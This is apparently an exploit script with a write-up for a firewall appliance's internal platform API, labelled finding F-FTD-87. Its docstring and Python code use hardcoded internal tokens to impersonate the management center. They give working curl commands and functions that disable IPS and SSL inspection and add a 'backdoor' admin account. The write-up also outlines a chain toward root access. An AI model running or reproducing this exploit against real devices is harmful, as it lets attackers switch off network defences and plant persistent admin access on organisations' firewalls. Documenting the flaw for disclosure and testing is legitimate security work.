"""
F-FTD-87: Hardcoded internal API tokens allow FMC/CLI impersonation at platform REST API
CONTROLLED ENVIRONMENT ONLY

Root cause:
  /usr/local/sf/lib/perl/5.24.4/SF/REST_API.pm:
    Active URL: http://127.0.0.1:5985/platform/api  (internal Perl REST client)

    Token mapping (from header transformation code):
      TOKEN: clish  →  FTD-CLI: true   (internal CLI-level access)
      TOKEN: hm     →  FMC: true       (FMC-level access — highest privilege)
      TOKEN: patch  →  FMC: true       (FMC-level access for patch operations)

  The platform API at localhost:5985 is the FTD's internal configuration API.
  It receives configuration commands from:
    1. The FDM web UI (via Tomcat on 443)
    2. An FMC manager (over sftunnel on 8305)
    3. Internal CLI scripts (via clish/mojo_server.conf on 8080)

  Authentication model:
    - External requests: require JWT token from /api/fdm/v6/fdm/token
    - Internal CLI requests: TOKEN: clish → FTD-CLI: true → bypasses JWT auth
    - FMC requests: TOKEN: hm → FMC: true → treated as authenticated FMC push

  FROM A WWW SHELL:
    www process can directly call localhost:5985 (no firewall restriction internally)
    Sending TOKEN: hm header → FTD treats request as coming from an authorized FMC
    → any platform API endpoint available to FMC is accessible

  CONFIRMED INTERNAL API MODULES (from SF/REST_API/*.pm):
    sys/auth-default          — FTD authentication defaults (AAA settings)
    sys/svc-ext/shell-svc-limits — shell/CLI service limits
    platform/api/* (general) — device config, interface config, routing, NAT, VPN

ATTACK:
  From www shell (localhost access only):

  1. Enumerate platform API endpoints:
     curl -s -H 'TOKEN: clish' http://127.0.0.1:5985/platform/api/

  2. Access as FMC (full management-plane access):
     curl -s -H 'TOKEN: hm' -H 'Content-Type: application/json' \
       http://127.0.0.1:5985/platform/api/devices/devicerecords

  3. Push malicious configuration as FMC:
     # Disable SSL inspection (drops decrypted-traffic inspection)
     curl -s -H 'TOKEN: hm' -X PUT \
       http://127.0.0.1:5985/platform/api/policy/sslpolicies/{id} \
       -d '{"action":"DO_NOT_DECRYPT","enabled":false}'

     # Add a new admin user
     curl -s -H 'TOKEN: hm' -X POST \
       http://127.0.0.1:5985/platform/api/object/users \
       -d '{"username":"backdoor","password":"Admin123","role":"admin"}'

  4. Disable IPS inspection (inject traffic bypass):
     curl -s -H 'TOKEN: hm' -X PUT \
       http://127.0.0.1:5985/platform/api/policy/intrusionpolicies/state \
       -d '{"enabled":false}'

  5. Access FMC-specific data (if platform API exposes FMC-synced data):
     curl -s -H 'TOKEN: hm' \
       http://127.0.0.1:5985/platform/api/object/networkaddresses

IMPACT:
  FMC-level token access to the platform API allows:
  a) Full read of all FTD configuration (network objects, policies, VPN tunnels)
  b) Push configuration changes without FMC UI — modifies FTD policy directly
  c) Disable security controls (IPS, SSL inspection, AMP) from www shell
  d) Add administrative users or backdoor accounts via platform API
  e) Modify routing/NAT to divert traffic
  f) Trigger FTD configuration deployment cycles → potential DoS during deploy

  IMPORTANT SCOPE NOTE:
  The platform API at 5985 is ONLY accessible from localhost. This attack requires:
  - www shell on FTD
  - The platform API service running (normal operational state)
  No external network access is required; this is purely from www → localhost.

  Platform API is NOT the FDM REST API (/api/fdm/v6/*). FDM API is on port 443
  and requires a valid JWT. Platform API is the internal configuration backend.

CHAIN:
  F-FTD-78 (pre-auth HA standby) OR F-FTD-79 (Admin123) → www shell
  → TOKEN: hm → FMC impersonation at platform API
  → push firewall policy that permits all traffic (removes inspection)
  → FTD becomes transparent pass-through for attacker traffic

  Combined with F-FTD-73/85 (root exec):
  → disable FTD IPS via platform API
  → pivot to root → modify sftunnel CA (F-FTD-76)
  → full FMC impersonation over sftunnel (not just localhost)

VERIFY (controlled environment):
  # Check platform API reachability from www shell:
  curl -sv http://127.0.0.1:5985/platform/api/ 2>&1 | head -20

  # Test CLI token:
  curl -s -H 'TOKEN: clish' http://127.0.0.1:5985/platform/api/sys/auth-default

  # Test FMC token:
  curl -s -H 'TOKEN: hm' http://127.0.0.1:5985/platform/api/devices/devicerecords

Affected: FTD 6.7.0-65 (SF/REST_API.pm confirmed token mapping)
Severity: HIGH — www shell can impersonate FMC at platform API, modify FTD policy,
          disable security controls, add admin users; no additional auth required
Auth required: www shell (post F-FTD-67, F-FTD-78, or other www access)
"""

# CONTROLLED ENVIRONMENT ONLY

import sys
import subprocess
import json

PLATFORM_API_BASE = "http://127.0.0.1:5985/platform/api"

# Hardcoded internal tokens
TOKENS = {
    "clish": {"header": "FTD-CLI", "value": "true",  "role": "FTD CLI — internal script access"},
    "hm":    {"header": "FMC",     "value": "true",  "role": "FMC — full management-plane access"},
    "patch": {"header": "FMC",     "value": "true",  "role": "FMC (patch operations)"},
}


def api_call(method, path, token="clish", body=None):
    """
    Make a request to the platform API with specified internal token.
    CONTROLLED ENVIRONMENT ONLY.
    """
    url = f"{PLATFORM_API_BASE}/{path.lstrip('/')}"
    cmd = [
        "curl", "-s", "-X", method,
        "-H", f"TOKEN: {token}",
        "-H", "Content-Type: application/json",
    ]

    if body:
        cmd += ["-d", json.dumps(body)]

    cmd.append(url)

    print(f"[*] F-FTD-87: {method} {url}")
    print(f"    TOKEN: {token} → {TOKENS.get(token, {}).get('header')}: {TOKENS.get(token, {}).get('value')}")

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if result.stdout:
            try:
                data = json.loads(result.stdout)
                print(f"    Response ({result.returncode}): {json.dumps(data, indent=2)[:500]}")
                return data
            except json.JSONDecodeError:
                print(f"    Response ({result.returncode}): {result.stdout[:300]}")
                return result.stdout
        else:
            print(f"    Response ({result.returncode}): empty / stderr: {result.stderr[:100]}")
            return None
    except Exception as e:
        print(f"    Error: {e}")
        return None


def enumerate_platform_api(token="clish"):
    """
    Enumerate available platform API endpoints.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print(f"[*] F-FTD-87: Enumerating platform API endpoints (token={token})")

    # Known endpoints from SF/REST_API/*.pm
    endpoints = [
        "/sys/auth-default",
        "/sys/svc-ext/shell-svc-limits",
        "/devices/devicerecords",
        "/policy/intrusionpolicies",
        "/policy/accesspolicies",
        "/policy/sslpolicies",
        "/object/networks",
        "/object/networkaddresses",
        "/object/users",
        "/interfaces",
        "/routing/virtualrouters",
    ]

    found = []
    for ep in endpoints:
        result = api_call("GET", ep, token)
        if result and result != "":
            print(f"    [+] Accessible: {ep}")
            found.append(ep)

    print(f"\n[*] Found {len(found)}/{len(endpoints)} accessible endpoints with token={token}")
    return found


def test_fmc_impersonation():
    """
    Test FMC token (hm) against platform API endpoints.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print("[*] F-FTD-87: Testing FMC impersonation via TOKEN: hm")
    print(f"    TOKEN: hm → FMC: true")
    print(f"    FMC-level requests bypass FTD-specific auth checks")
    print()
    api_call("GET", "/sys/auth-default", token="hm")
    print()
    api_call("GET", "/devices/devicerecords", token="hm")


def disable_ips_inspection(policy_id="default", token="hm"):
    """
    Attempt to disable IPS inspection via FMC token.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print(f"[*] F-FTD-87: Attempting to disable IPS inspection via FMC token")
    print(f"    This would allow all network traffic through uninspected")
    body = {"enabled": False, "action": "DISABLED"}
    api_call("PUT", f"/policy/intrusionpolicies/{policy_id}/state", token=token, body=body)


def print_token_map():
    """Print the hardcoded token mapping."""
    print("""
F-FTD-87: Hardcoded Internal Platform API Token Mapping
========================================================

Source: /usr/local/sf/lib/perl/5.24.4/SF/REST_API.pm
Platform API: http://127.0.0.1:5985/platform/api  (localhost only)

Token mapping:
  TOKEN: clish  →  FTD-CLI: true   (internal CLI operations)
  TOKEN: hm     →  FMC: true       (FMC management-plane — highest privilege)
  TOKEN: patch  →  FMC: true       (FMC patch/upgrade operations)

Access model:
  - No externally-issued JWT required for localhost requests with these tokens
  - clish token: same as running from the FTD CLI — config read/write for CLI ops
  - hm token: same as an authenticated FMC push — full policy management

Impact from www shell:
  → Disable IPS, SSL inspection, AMP file scanning
  → Modify access control policies (add permit-any rule)
  → Push malicious routing/NAT (redirect traffic)
  → Add administrative backdoor users to FTD
  → Read complete FTD configuration graph (all policy objects, VPN, interfaces)
""")


if __name__ == "__main__":
    print("=" * 70)
    print("F-FTD-87: Platform API token impersonation (FMC/CLI via hardcoded tokens)")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)

    mode = sys.argv[1] if len(sys.argv) > 1 else "show"

    if mode == "show":
        print_token_map()

    elif mode == "enum":
        token = sys.argv[2] if len(sys.argv) > 2 else "clish"
        enumerate_platform_api(token)

    elif mode == "fmc":
        test_fmc_impersonation()

    elif mode == "disable-ips":
        policy_id = sys.argv[2] if len(sys.argv) > 2 else "default"
        disable_ips_inspection(policy_id)

    elif mode == "get":
        if len(sys.argv) < 3:
            print(f"Usage: {sys.argv[0]} get <path> [token]")
            sys.exit(1)
        path = sys.argv[2]
        token = sys.argv[3] if len(sys.argv) > 3 else "clish"
        api_call("GET", path, token)

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
